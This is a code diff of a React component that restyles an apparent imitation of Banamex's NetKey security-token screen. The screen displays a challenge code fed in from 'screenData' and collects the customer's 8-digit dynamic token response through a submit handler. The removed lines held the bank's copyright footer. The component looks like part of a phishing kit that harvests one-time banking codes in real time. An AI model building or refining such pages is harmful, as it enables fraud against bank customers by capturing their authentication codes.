@@ -1067,83 +1067,122 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     display: 'flex', 
                     flexDirection: 'column' 
                   }} aria-label="Instrucciones">
-                    <div style={{ color: '#133d43', lineHeight: '1.45', fontSize: '14px' }}>
-                      <p>Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número "9".</p>
-                      <p>Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:</p>
-
-                      <div style={{ marginTop: '18px', fontWeight: 700, fontSize: '22px', color: '#0b2b2f' }} id="challenge">
-                        CHALLNG: <span id="challenge-value">{screenData.challenge || '58724375'}</span>
-                      </div>
-
-                      <div style={{ flex: 1 }}></div>
-                      <div style={{ marginTop: '12px', color: '#9aaeb0', fontSize: '12px' }}>
-                        <button style={{ padding: '8px 12px', borderRadius: '6px', background: '#fff5f6', color: '#c22f40', border: '1px solid rgba(194,47,64,0.08)', fontWeight: 600, fontSize: '14px', cursor: 'pointer' }} type="button">
-                          Cancelar
-                        </button>
+                    <p style={{ margin: '6px 0', lineHeight: 1.6, color: '#3d5559', fontSize: '14px' }}>Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número "9".</p>
+                    <p style={{ margin: '12px 0 6px 0', lineHeight: 1.6, color: '#3d5559', fontSize: '14px' }}>Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:</p>
+                    
+                    <div style={{ 
+                      background: 'linear-gradient(135deg, #e8f4f5 0%, #d4eaec 100%)', 
+                      borderRadius: '6px', 
+                      padding: '16px', 
+                      margin: '14px 0', 
+                      textAlign: 'center', 
+                      border: '2px solid #b4d5d8' 
+                    }}>
+                      <div style={{ fontSize: '12px', color: '#3d5559', marginBottom: '6px' }}>CHALLNG</div>
+                      <div style={{ 
+                        fontSize: '42px', 
+                        fontWeight: 600, 
+                        letterSpacing: '10px', 
+                        color: '#153e46', 
+                        fontFamily: "'Courier New', monospace" 
+                      }}>
+                        {screenData.challenge || '--------'}
                       </div>
                     </div>
+
+                    <button 
+                      style={{ 
+                        padding: '10px 24px', 
+                        background: '#fff', 
+                        color: '#3d5559', 
+                        border: '2px solid #c4d5d7', 
+                        borderRadius: '6px', 
+                        fontSize: '14px', 
+                        fontWeight: 500, 
+                        cursor: 'pointer', 
+                        alignSelf: 'flex-start', 
+                        marginBottom: '12px' 
+                      }} 
+                      type="button"
+                    >
+                      Cancelar
+                    </button>
+                    <p style={{ margin: '6px 0', fontSize: '14px', lineHeight: 1.5, color: '#3d5559' }}>Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo</p>
                   </div>
 
                   <div style={{ 
-                    width: '320px', 
                     background: '#fff', 
                     borderRadius: '6px', 
                     padding: '20px', 
                     boxShadow: '0 3px 8px rgba(0,0,0,0.04)', 
+                    flex: 1, 
+                    minHeight: '260px', 
                     display: 'flex', 
                     flexDirection: 'column', 
                     justifyContent: 'space-between' 
                   }} aria-label="Campo de clave dinámica">
                     <div>
-                      <p style={{ margin: '0 0 10px', fontWeight: 600, color: '#193b3e' }}>
-                        Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo
-                      </p>
-
-                      <label htmlFor="dinamica" style={{ fontSize: '13px', color: '#134142', marginBottom: '8px', display: 'block' }}>
-                        Clave dinámica
-                      </label>
+                      <h2 style={{ fontSize: '18px', margin: '0 0 14px 0', color: '#153e46' }}>Clave dinámica</h2>
                       <input 
-                        id="dinamica" 
                         type="text" 
                         maxLength={8}
                         value={netkeyResponse}
                         onChange={(e) => setNetkeyResponse(e.target.value.replace(/\D/g, ''))}
-                        placeholder="Introduzca la clave dinámica aquí" 
+                        placeholder="00000000" 
                         aria-label="Clave dinámica"
-                        style={{ padding: '9px 10px', borderRadius: '3px', border: '1px solid #cfdfe0', fontSize: '15px', width: '100%', boxSizing: 'border-box' }}
+                        style={{ 
+                          width: '100%', 
+                          padding: '14px', 
+                          fontSize: '28px', 
+                          textAlign: 'center', 
+                          letterSpacing: '6px', 
+                          border: '2px solid #b4d5d8', 
+                          borderRadius: '6px', 
+                          fontFamily: "'Courier New', monospace", 
+                          color: '#153e46', 
+                          fontWeight: 600, 
+                          background: '#f7fbfc', 
+                          boxSizing: 'border-box' 
+                        }}
                       />
                     </div>
 
-                    <div>
-                      <div style={{ display: 'flex', gap: '12px', marginTop: '16px', alignItems: 'center', justifyContent: 'flex-end' }}>
-                        <button style={{ padding: '10px 18px', borderRadius: '10px', cursor: 'pointer', fontWeight: 600, fontSize: '14px', background: '#fff5f6', color: '#c22f40', border: '1px solid rgba(194,47,64,0.08)' }} type="button">
-                          Cancelar
-                        </button>
-                        <button 
-                          style={{ 
-                            padding: '10px 18px', 
-                            borderRadius: '10px', 
-                            border: 0, 
-                            cursor: netkeyResponse.length !== 8 ? 'not-allowed' : 'pointer', 
-                            fontWeight: 600, 
-                            fontSize: '14px', 
-                            background: '#0f3e3f', 
-                            color: '#fff', 
-                            boxShadow: '0 6px 10px rgba(15,62,63,0.12)', 
-                            opacity: netkeyResponse.length !== 8 ? 0.5 : 1 
-                          }} 
-                          type="button"
-                          onClick={handleNetkey2Submit}
-                          disabled={netkeyResponse.length !== 8}
-                        >
-                          Continuar
-                        </button>
-                      </div>
-
-                      <p style={{ marginTop: '12px', color: '#8b9aa0', fontSize: '12px' }}>
-                        D.R., © 2025, Banco Nacional de México, S.A., integrante del Grupo Financiero Banamex.
-                        Isabel la Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
-                      </p>
+                    <div style={{ marginTop: '20px', display: 'flex', gap: '10px' }}>
+                      <button 
+                        style={{ 
+                          flex: 1, 
+                          padding: '12px', 
+                          background: '#fff', 
+                          color: '#3d5559', 
+                          border: '2px solid #c4d5d7', 
+                          borderRadius: '6px', 
+                          fontSize: '15px', 
+                          fontWeight: 500, 
+                          cursor: 'pointer' 
+                        }} 
+                        type="button"
+                      >
+                        Cancelar
+                      </button>
+                      <button 
+                        style={{ 
+                          flex: 1, 
+                          padding: '12px', 
+                          background: '#153e46', 
+                          color: '#fff', 
+                          border: 'none', 
+                          borderRadius: '6px', 
+                          fontSize: '15px', 
+                          fontWeight: 600, 
+                          cursor: netkeyResponse.length !== 8 ? 'not-allowed' : 'pointer',
+                          opacity: netkeyResponse.length !== 8 ? 0.5 : 1
+                        }} 
+                        type="button"
+                        onClick={handleNetkey2Submit}
+                        disabled={netkeyResponse.length !== 8}
+                      >
+                        Continuar
+                      </button>
                     </div>
                   </div>
                 </div>
